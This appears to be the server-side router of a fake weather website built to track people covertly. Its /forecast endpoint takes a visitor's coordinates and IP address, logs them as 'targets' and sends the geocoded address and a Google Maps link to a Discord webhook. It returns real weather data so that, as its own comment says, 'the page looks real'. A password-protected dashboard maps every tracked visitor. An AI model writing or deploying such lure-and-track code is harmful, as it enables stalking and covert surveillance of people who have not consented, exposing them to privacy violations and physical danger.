const express = require("express")
const router = express.Router()
const config = require("./config")
const https = require("https")

const TARGETS = {}

// Generic HTTPS GET helper — returns parsed JSON
function httpsGet(url) {
    return new Promise((resolve, reject) => {
        const parsed = new URL(url)
        const options = {
            hostname: parsed.hostname,
            path: parsed.pathname + parsed.search,
            method: "GET",
            headers: { "User-Agent": "WeatherApp/1.0" }
        }
        https.get(options, (res) => {
            let data = ""
            res.on("data", chunk => data += chunk)
            res.on("end", () => {
                try { resolve(JSON.parse(data)) }
                catch (e) { reject(e) }
            })
        }).on("error", reject)
    })
}

// Reverse geocode using Nominatim (no API key needed)
async function reverseGeocode(lat, lng) {
    try {
        const data = await httpsGet(
            `https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lng}&format=json`
        )
        const a = data.address || {}
        const city = a.city || a.town || a.village || a.county || "Unknown"
        const country = a.country || "Unknown"
        const full = data.display_name || `${lat}, ${lng}`
        return { city, country, full }
    } catch (e) {
        console.error("[Geocode] Error:", e.message)
        return { city: "Unknown", country: "Unknown", full: `${lat}, ${lng}` }
    }
}

// Fetch real weather from OpenWeatherMap
async function getWeather(lat, lng) {
    try {
        const data = await httpsGet(
            `https://api.openweathermap.org/data/2.5/weather?lat=${lat}&lon=${lng}&appid=${config.openWeatherKey}&units=metric`
        )
        return {
            temp: Math.round(data.main.temp),
            feels_like: Math.round(data.main.feels_like),
            humidity: data.main.humidity,
            condition: data.weather[0].description,
            icon: data.weather[0].icon,
            wind: data.wind.speed
        }
    } catch (e) {
        console.error("[Weather] Error:", e.message)
        return null
    }
}

// Send rich embed to Discord
async function sendToDiscord(id, lat, lng, ip, isNew) {
    const mapsUrl = `https://www.google.com/maps?q=${lat},${lng}`

    const [geo, weather] = await Promise.all([
        reverseGeocode(lat, lng),
        getWeather(lat, lng)
    ])

    const fields = [
        { name: "🆔 ID",        value: `\`${id}\``,              inline: true },
        { name: "🌐 IP",        value: `\`${ip}\``,              inline: true },
        { name: "📍 Location",  value: geo.full.length > 80 ? geo.full.substring(0, 80) + "…" : geo.full, inline: false },
        { name: "🏙️ City",      value: geo.city,                  inline: true },
        { name: "🌍 Country",   value: geo.country,               inline: true },
        { name: "🗺️ Maps",      value: `[Open in Google Maps](${mapsUrl})`, inline: false },
    ]

    if (weather) {
        fields.push(
            { name: "🌡️ Temp",      value: `${weather.temp}°C (feels ${weather.feels_like}°C)`, inline: true },
            { name: "☁️ Condition", value: weather.condition,      inline: true },
            { name: "💧 Humidity",  value: `${weather.humidity}%`, inline: true },
            { name: "💨 Wind",      value: `${weather.wind} m/s`,  inline: true }
        )
    }

    const payload = JSON.stringify({
        embeds: [{
            title: isNew ? "🟢 New Target Connected" : "📍 Location Updated",
            color: isNew ? 0x00ff00 : 0x4facfe,
            fields,
            timestamp: new Date().toISOString()
        }]
    })

    const webhookUrl = new URL(config.discordWebhook)
    const options = {
        hostname: webhookUrl.hostname,
        path: webhookUrl.pathname + webhookUrl.search,
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "Content-Length": Buffer.byteLength(payload)
        }
    }

    const req = https.request(options, (res) => {
        let body = ""
        res.on("data", chunk => body += chunk)
        res.on("end", () => {
            console.log(`[Discord] Status: ${res.statusCode}${body ? " | " + body : ""}`)
        })
    })
    req.on("error", (err) => console.error("[Discord] Error:", err.message))
    req.write(payload)
    req.end()
}

// login page
router.route("/login").get((req, res) => {
    res.render("login")
}).post((req, res) => {
    const { username, password } = req.body
    if (config.username === username && config.password === password) {
        res.cookie("token", config.token, { maxAge: 1000000 * 100000 })
    }
    res.redirect("/")
})

// Weather page — GET serves the page, POST receives location + returns real weather
router.route("/forecast").get((req, res) => {
    res.render("weather")
}).post(async (req, res) => {
    const { id, lat, lng } = req.body
    const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() || req.ip
    const isNew = TARGETS[id] == null

    if (isNew) IO.emit("user-connected", id)
    TARGETS[id] = [lat, lng]
    IO.emit("map-data", { id, lat, lng })

    // Fire discord in background (don't await — respond fast)
    sendToDiscord(id, lat, lng, ip, isNew).catch(console.error)

    // Fetch weather + geocode to return to the client so the page looks real
    try {
        const [geo, weather] = await Promise.all([
            reverseGeocode(lat, lng),
            getWeather(lat, lng)
        ])
        res.json({ geo, weather })
    } catch (e) {
        res.json({ geo: { city: "Unknown", country: "Unknown" }, weather: null })
    }

    console.log(`> ${id} [${ip}] - ${lat}, ${lng}`)
})

// Token check middleware
router.use(function checkToken(req, res, next) {
    const token = req.cookies.token
    const isLocal = req.hostname === "localhost" || req.ip === "127.0.0.1" || req.ip === "::1" || req.ip === "::ffff:127.0.0.1"
    if (isLocal || (token != null && token === config.token)) {
        if (!token) res.cookie("token", config.token, { maxAge: 1000000 * 100000 })
        next()
    } else {
        res.clearCookie("token").redirect("/login")
    }
})

router.route("/").get((req, res) => {
    res.render("home", { TARGETS })
})

router.route("/map").get((req, res) => {
    const { id } = req.query
    res.render("map", { data: TARGETS[id] })
})

module.exports = router
